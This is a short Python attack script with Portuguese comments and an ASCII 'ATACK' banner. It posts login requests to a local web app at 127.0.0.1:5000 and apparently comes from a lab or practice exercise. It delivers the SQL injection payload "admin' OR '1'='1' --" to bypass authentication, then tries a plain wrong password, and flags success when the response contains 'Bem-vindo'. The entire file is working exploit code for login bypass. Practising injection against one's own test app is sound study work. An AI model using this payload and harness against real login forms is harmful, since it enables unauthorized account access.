import requests

LOGIN_URL = 'http://127.0.0.1:5000/login'

def tentar_login (username_playload, password_playload):
    
    data = {
        'username': username_playload,
        'password': password_playload
    }
    print(f"\n --- Tentando atack ---")
    print(f"Playload (User): {username_playload}")
    print(f"Playload (Pass): {password_playload}")
    
    try:
        response = requests.post(LOGIN_URL, data = data)
        print(f"Status Code: {response.status_code}")
        print(f"Resposta: {response.text}")
        
        if "Bem-vindo" in response.text:
            print("[!!!] ATAQUE BEM-SUCEDIDO [!!!]")
            
    except requests.exceptions.ConnectionError:
        print("[ERRO] Não foi possivel conectar :( ")
        
        
# --- ATACK ---
print(r'''
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║    █████╗ ████████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗  ╔╝   ╔══╗
║   ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗██║ ██╔╝██║ ██╔╝██║ ╚═╝   ╚═╝
║   ███████║   ██║   ██║   ██║██████╔╝██║   ██║█████╔╝ █████╔╝ █████╗
║   ██╔══██║   ██║   ██║   ██║██╔══██╗██║   ██║██╔═██╗ ██╔═██╗ ╚════╝
║   ██║  ██║   ██║   ╚██████╔╝██║  ██║╚██████╔╝██║  ██╗██║  ██╗█╗
║   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚╝
║                                                                    ║
║                  ──  •  A  -  T  -  A  -  C  -  K  •  ──           ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
''')


playload_user_1 = "admin' OR '1'='1' --"
playload_pass_1 = "seila"
tentar_login(playload_user_1, playload_pass_1)

playload_user_2 = "admin"
playload_pass_2 = "senhaerrada"
tentar_login(playload_user_2, playload_pass_2)
